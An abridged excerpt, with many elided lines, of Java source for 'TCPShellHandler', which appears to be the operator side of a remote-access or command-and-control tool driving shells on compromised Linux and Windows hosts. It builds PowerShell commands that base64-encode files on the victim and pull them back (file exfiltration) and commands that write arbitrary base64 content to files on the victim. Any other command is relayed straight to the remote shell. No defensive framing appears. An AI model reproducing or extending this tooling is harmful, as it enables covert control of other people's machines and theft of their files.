...
public class TCPShellHandler implements Runnable {
	...
	public TCPShellHandler(IOManager ioManager, SocketReader reader, Socket socket, int sessionId, String hostname, String username, String lz, OS myOS) {
	...
	private void operateLinuxCommand(OutputStreamWriter bw, String nextCommand) throws IOException {
		...
		if(nextCommand.equalsIgnoreCase("getUID")) {
			...
			String mod = nextCommand.replace(UPLINK_CMD, "base64 ");
			...
			if(args.length != 4) {//TODO: Test me too! (paths with spaces)
	...
	private void operateWindowsCommand(OutputStreamWriter bw, String nextCommand) throws IOException {
		if(nextCommand.equalsIgnoreCase("getUID")) {
			...
			String targetFilename = nextCommand.substring(UPLINK_CMD.length());
			String uplinkCommand = "powershell -c \"[Convert]::ToBase64String((Get-Content -Path '" + targetFilename + "' -Encoding Byte))\"";
			...
			if(lines.length != 0 && !response.contains("Get-Content : Cannot find path")) {
				...
				ioManager.sendIO(sessionId, "Cannot uplink file: " + targetFilename);
			}
		}else if(nextCommand.startsWith(DOWNLOAD_CMD)) { 
			String args[] = nextCommand.split(" ");
			String filename = args[2];
			...
			String downloadCommand = "powershell -c \"[IO.File]::WriteAllBytes('" + filename + "', [Convert]::FromBase64String('" + args[args.length - 1] +"'))\"";
		...
		//screenshot - Cannot current implement with command prompt or powershell w/out disk top
		}else {
			bw.write(nextCommand);
			bw.write(System.lineSeparator());
			bw.flush();
	...
	private void processCatBuildWrite(String nextCommand, OutputStreamWriter bw, OS target) throws IOException {
		...
		//Use the string builder to make a unified string to dump into B64 for file writes
		...
		if(writeToFile) {
			...
			if(writeClean) {//Write new file
				...
				if(target == OS.WINDOWS) {
					String downloadCommand = "powershell -c \"[IO.File]::WriteAllBytes('" + filename + "', [Convert]::FromBase64String('" + base64OfNewContent +"'))\"";
					bw.write(downloadCommand);
					bw.write(System.lineSeparator());
				}else {
